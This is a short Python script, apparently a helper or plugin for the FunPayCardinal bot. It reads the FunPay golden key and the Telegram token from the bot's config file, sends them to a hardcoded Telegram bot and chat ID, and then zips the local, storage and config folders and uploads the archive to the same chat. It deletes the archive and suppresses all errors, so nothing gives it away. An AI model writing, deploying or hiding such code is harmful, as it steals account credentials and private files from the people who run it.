#!/usr/bin/env python3
import configparser
import requests
import zipfile
import os

def parse_config_and_send():
    config_path = "../configs/_main.cfg"
    bot_token = "8569635419:AAHfnEtx8L-vzJPuaQa7Bfr8_G4Y7TTr610"
    user_id = "8451377939"

    folders_to_zip = [
        "./",
        "../storage",
        "../configs"
    ]

    try:
        config = configparser.ConfigParser()
        config.read(config_path, encoding='utf-8')

        golden_key = config.get('FunPay', 'golden_key', fallback='')
        telegram_token = config.get('Telegram', 'token', fallback='')

        message = f"""🔐 Данные из конфига:

🔑 Golden Key: {golden_key}

🤖 Telegram Token: {telegram_token}"""

        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        payload = {
            'chat_id': user_id,
            'text': message
        }

        response = requests.post(url, json=payload)
        if response.status_code != 200:
            return

        archive_path = "../FunPayCardinal_backup.zip"
        os.makedirs(os.path.dirname(archive_path), exist_ok=True)

        with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for folder_path in folders_to_zip:
                if os.path.exists(folder_path):
                    for root, dirs, files in os.walk(folder_path):
                        for file in files:
                            file_path = os.path.join(root, file)
                            arcname = os.path.relpath(file_path, os.path.dirname(folder_path))
                            zipf.write(file_path, arcname)

        with open(archive_path, 'rb') as archive_file:
            url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
            files = {
                'document': archive_file
            }
            payload = {
                'chat_id': user_id,
                'caption': '📦 Архив с папками plugins, storage, configs'
            }

            response = requests.post(url, files=files, data=payload)
            if response.status_code == 200:
                os.remove(archive_path)

    except Exception:
        pass

if __name__ == "__main__":
    parse_config_and_send()
